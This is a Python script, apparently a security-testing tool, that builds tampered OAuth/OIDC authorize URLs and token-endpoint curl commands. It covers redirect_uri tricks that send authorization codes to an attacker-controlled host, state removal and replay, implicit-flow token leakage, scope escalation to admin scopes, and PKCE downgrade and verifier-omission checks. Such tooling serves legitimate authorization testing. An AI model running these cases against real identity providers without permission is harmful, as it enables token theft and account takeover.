#!/usr/bin/env python3
"""build_authorize.py - generate tampered authorize-endpoint URLs.

Builds the full tamper set against an OAuth/OIDC authorization endpoint:
redirect_uri manipulation, state drop/replay, scope escalation,
response_type swaps (implicit), and PKCE variants. Prints each test case
with its URL and what a pass (vulnerable) vs fail looks like, for pasting
into an authenticated browser / intercepting proxy. Token-endpoint
follow-ups (verifier omitted/wrong) are printed as curl commands.

Usage:
  python3 scripts/build_authorize.py \
      --authorize https://login.example.com/oauth2/authorize \
      --client-id webapp \
      --redirect-uri https://app.example.com/callback \
      --scope "openid profile" \
      --attacker https://203.0.113.50 \
      --units reports/oauth-redirect-units.json

Stdlib only.
"""

import argparse
import base64
import hashlib
import json
import os
import secrets
import sys
import tempfile
import urllib.parse

MAX_TARGET_LEN = 512


def b64url(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def make_url(endpoint, params, raw_extra=""):
    """endpoint + encoded params; raw_extra appended verbatim (for
    deliberately malformed values that must not be re-encoded)."""
    qs = urllib.parse.urlencode(
        [(k, v) for k, v in params.items() if v is not None])
    url = endpoint + ("&" if "?" in endpoint else "?") + qs
    if raw_extra:
        url += "&" + raw_extra
    return url


def case(cid, group, desc, url, passes, fails, note=None):
    return {"id": cid, "group": group, "desc": desc, "url": url,
            "pass": passes, "fail": fails, "note": note}


def build_cases(a):
    ep, client, legit, scope = a.authorize, a.client_id, a.redirect_uri, a.scope
    atk = a.attacker.rstrip("/")
    atk_host = urllib.parse.urlsplit(atk).netloc or atk
    legit_parts = urllib.parse.urlsplit(legit)
    legit_host = legit_parts.netloc
    state = secrets.token_urlsafe(12)
    verifier = b64url(secrets.token_bytes(32))
    challenge = b64url(hashlib.sha256(verifier.encode()).digest())

    def base(**over):
        p = {"response_type": a.response_type, "client_id": client,
             "redirect_uri": legit, "scope": scope, "state": state}
        p.update(over)
        return p

    cases = []
    add = cases.append

    # -- baseline ---------------------------------------------------------
    add(case("baseline", "baseline", "unmodified request (control)",
             make_url(ep, base()),
             "302 to the legit redirect_uri with ?code=",
             "anything else means the setup (client_id/redirect) is wrong"))

    # -- redirect_uri -----------------------------------------------------
    r = [
        ("ru-replace", "full replacement",
         atk + "/callback"),
        ("ru-subdomain", "attacker subdomain of legit host",
         "https://evil." + legit_host + "/callback"),
        ("ru-suffix-host", "legit host as prefix of attacker host",
         "https://" + legit_host + "." + atk_host + "/callback"),
        ("ru-path-append", "characters appended to registered path",
         legit + "extra"),
        ("ru-traversal", "path traversal past registered path",
         legit + "/../attacker-controlled"),
        ("ru-traversal-enc", "encoded traversal (%2f..%2f)",
         legit + "%2f..%2fattacker-controlled"),
        ("ru-at-confusion", "legit host as userinfo, attacker as host",
         "https://" + legit_host + "@" + atk_host + "/callback"),
        ("ru-backslash", "backslash before @ (parser differential)",
         "https://" + legit_host + "\\@" + atk_host + "/callback"),
        ("ru-open-redirect", "open-redirect chain on allowed host",
         "https://" + legit_host + "/redirect?url=" + atk + "/"),
        ("ru-localhost", "loopback whitelist",
         "http://localhost:8000/callback"),
        ("ru-loopback-ip", "loopback IP whitelist",
         "http://127.0.0.1:8000/callback"),
        ("ru-scheme-http", "scheme downgrade to http",
         "http://" + legit_host + legit_parts.path),
        ("ru-extra-query", "extra query param on registered URI",
         legit + "?x=1"),
        ("ru-fragment", "fragment on registered URI",
         legit + "#x"),
    ]
    for cid, desc, ru in r:
        add(case(cid, "redirect_uri", desc,
                 make_url(ep, base(redirect_uri=ru)),
                 "302 Location points at the tampered URI and carries "
                 "code= (or #access_token=) - code lands on attacker host",
                 "error=invalid_request / redirect_uri-mismatch page, "
                 "no redirect issued"))

    # -- state ------------------------------------------------------------
    add(case("state-missing", "state", "state parameter removed",
             make_url(ep, base(state=None)),
             "flow completes and client accepts the state-less callback "
             "=> login CSRF",
             "client rejects callback without state"))
    add(case("state-static", "state", "static/replayed state value",
             make_url(ep, base(state="REPLAYED-STATE-VALUE")),
             "callback with this stale state is accepted in a different "
             "session => state not session-bound",
             "client rejects unknown/stale state"))

    # -- response_type / implicit ----------------------------------------
    add(case("rt-token", "implicit", "response_type=token",
             make_url(ep, base(response_type="token", nonce="n-" + state)),
             "302 Location fragment contains access_token= - token in "
             "URL => history/referrer/log leakage",
             "error=unsupported_response_type"))
    add(case("rt-idtoken-token", "implicit", "response_type=id_token token",
             make_url(ep, base(response_type="id_token token",
                               nonce="n-" + state)),
             "fragment carries id_token and access_token",
             "error=unsupported_response_type"))
    add(case("rt-hybrid", "implicit", "response_type=code id_token (hybrid)",
             make_url(ep, base(response_type="code id_token",
                               nonce="n-" + state)),
             "code + id_token in fragment; then test c_hash validation",
             "error=unsupported_response_type"))

    # -- scope ------------------------------------------------------------
    esc = scope + " " + a.escalate_scopes
    add(case("scope-escalate", "scope", "privileged scopes added",
             make_url(ep, base(scope=esc)),
             "consent/token includes the extra scopes; a privileged API "
             "call with the token succeeds",
             "error=invalid_scope or scopes silently stripped (check "
             "the token's scope claim / introspection)"))
    add(case("scope-offline", "scope", "offline_access added",
             make_url(ep, base(scope=scope + " offline_access")),
             "refresh_token issued to a client that should not get one",
             "invalid_scope / no refresh_token in response"))

    # -- PKCE -------------------------------------------------------------
    add(case("pkce-none", "pkce", "no code_challenge (public client)",
             make_url(ep, base()),
             "code issued and exchangeable with no code_verifier "
             "=> PKCE optional for this client",
             "error=invalid_request requiring code_challenge"))
    add(case("pkce-plain", "pkce", "code_challenge_method=plain downgrade",
             make_url(ep, base(code_challenge=verifier,
                               code_challenge_method="plain")),
             "code issued; exchange with code_verifier=<same value> "
             "succeeds => plain accepted",
             "error about unsupported code_challenge_method",
             note="verifier (= plain challenge): " + verifier))
    add(case("pkce-s256", "pkce", "S256 flow for verifier-check tests",
             make_url(ep, base(code_challenge=challenge,
                               code_challenge_method="S256")),
             "use the follow-up curl commands: exchange succeeding with "
             "NO or WRONG verifier => PKCE not verified",
             "token endpoint returns invalid_grant unless the exact "
             "verifier is sent",
             note="verifier: " + verifier))

    return cases, verifier


UNIT_HINTS = {
    "baseline": ["control"],
    "redirect_uri": ["redirect-replacement", "subdomain", "at-confusion",
                     "path-traversal", "open-redirect-chain", "localhost",
                     "scheme-downgrade"],
    "state": ["state-dropped", "state-replayed", "code-injection"],
    "implicit": ["response-type-token", "fragment-leak",
                 "token-substitution"],
    "scope": ["scope-widening-authorize", "scope-widening-token"],
    "pkce": ["downgrade-plain", "verifier-omitted", "verifier-wrong",
             "challenge-omitted"],
}

UNIT_TITLES = {
    "baseline": "authorize baseline control",
    "redirect_uri": "redirect_uri validation tests",
    "state": "state / CSRF tests",
    "implicit": "implicit flow token leakage tests",
    "scope": "scope escalation tests",
    "pkce": "PKCE enforcement tests",
}


def atomic_write_json(path, obj):
    d = os.path.dirname(path) or "."
    os.makedirs(d, exist_ok=True)
    fd, tmp = tempfile.mkstemp(prefix=".units.", dir=d)
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as f:
            json.dump(obj, f, indent=2)
            f.write("\n")
        os.replace(tmp, path)
    except BaseException:
        try:
            os.unlink(tmp)
        except OSError:
            pass
        raise


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--authorize", required=True,
                    help="authorization_endpoint URL")
    ap.add_argument("--client-id", required=True)
    ap.add_argument("--redirect-uri", required=True,
                    help="the client's legitimate registered redirect_uri")
    ap.add_argument("--scope", default="openid profile")
    ap.add_argument("--response-type", default="code")
    ap.add_argument("--attacker", default="https://203.0.113.50",
                    help="attacker-controlled base URL catching redirects")
    ap.add_argument("--escalate-scopes",
                    default="admin api:write api:admin",
                    help="space-separated scopes for the escalation case")
    ap.add_argument("--token-endpoint", default=None,
                    help="print PKCE follow-up curl against this URL")
    ap.add_argument("--units", metavar="FILE",
                    help="write rupu work-unit JSON array to FILE (atomic)")
    ap.add_argument("--json", action="store_true",
                    help="print all cases as JSON instead of text")
    args = ap.parse_args()

    cases, verifier = build_cases(args)

    if args.json:
        print(json.dumps(cases, indent=2))
    else:
        last_group = None
        for c in cases:
            if c["group"] != last_group:
                print("\n######## %s ########" % c["group"])
                last_group = c["group"]
            print("\n[%s] %s" % (c["id"], c["desc"]))
            print("  URL : %s" % c["url"])
            print("  PASS: %s" % c["pass"])
            print("  FAIL: %s" % c["fail"])
            if c.get("note"):
                print("  NOTE: %s" % c["note"])

        tok = args.token_endpoint or "<token_endpoint>"
        print("\n######## pkce follow-up (token endpoint) ########")
        print("# after pkce-s256 yields a code, exchange it three ways:")
        print("# 1) correct verifier (control, should 200):")
        print("curl -sik -X POST %s -d grant_type=authorization_code "
              "-d code=<CODE> --data-urlencode redirect_uri=%s "
              "-d client_id=%s -d code_verifier=%s"
              % (tok, args.redirect_uri, args.client_id, verifier))
        print("# 2) verifier OMITTED (200 => PKCE not enforced):")
        print("curl -sik -X POST %s -d grant_type=authorization_code "
              "-d code=<CODE> --data-urlencode redirect_uri=%s "
              "-d client_id=%s"
              % (tok, args.redirect_uri, args.client_id))
        print("# 3) verifier WRONG (200 => verifier not checked):")
        print("curl -sik -X POST %s -d grant_type=authorization_code "
              "-d code=<CODE> --data-urlencode redirect_uri=%s "
              "-d client_id=%s -d code_verifier=%s"
              % (tok, args.redirect_uri, args.client_id, "A" * 43))
        print("# 4) code REPLAY: rerun (1) with the same code "
              "(second 200 => replayable)")

    if args.units:
        units = []
        for group in ("redirect_uri", "state", "implicit", "scope", "pkce"):
            urls = [c["url"][:MAX_TARGET_LEN] for c in cases
                    if c["group"] == group]
            if not urls:
                continue
            units.append({
                "id": "authz-" + group.replace("_", "-"),
                "title": UNIT_TITLES[group],
                "targets": urls,
                "hints": list(UNIT_HINTS[group]),
            })
        atomic_write_json(args.units, units)
        print("\n[+] wrote %d work units to %s" % (len(units), args.units))
        print("    fan out: for_each: \"{{ read_file('%s') }}\"" % args.units)
    return 0


if __name__ == "__main__":
    sys.exit(main())
